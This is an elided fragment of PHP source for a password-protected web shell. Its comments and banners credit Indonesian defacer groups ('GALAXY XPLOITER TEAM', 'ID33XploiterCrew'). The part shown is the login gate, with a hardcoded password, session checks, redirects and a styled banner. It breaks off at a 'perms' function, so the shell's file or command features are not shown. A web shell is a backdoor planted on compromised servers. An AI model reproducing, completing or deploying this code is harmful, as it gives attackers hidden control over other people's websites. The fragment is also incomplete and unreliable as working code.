<?php 
// Shell Mr.Lutfie404 Ft Mister G
// My Team = GALAXY XPLOITER TEAM 
...
session_start();
$pass = "kuroamekaito133221";
$link = "fvck.txt";
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?piKAcyu=piKAcyu'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
...
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?kuroame=kuroame'</script>";
}
...
<body bgcolor="black">
	...
	<center><h1><center><font color="red" face="Patrick Hand">ID33XploiterCrew<br> Berdoa dulu</font><font color="white" face="Patrick Hand"> sebelom login </font><br>
</center>
...
<body>
<center><font size="5" color="red" face="Patrick Hand"><h2>-=[ piKAcyu ]=-</h2></font>
</center>
...
echo '<center><br/>© ID33XploiterCrew</center>
</body>
</html>';
function perms($file){
